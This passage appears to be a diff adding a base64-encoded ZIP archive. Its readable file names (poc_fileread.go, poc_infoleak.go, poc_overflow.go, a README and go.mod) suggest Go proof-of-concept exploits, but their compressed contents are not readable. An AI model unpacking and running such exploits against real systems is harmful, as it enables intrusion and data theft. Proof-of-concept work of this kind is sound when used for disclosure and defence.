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
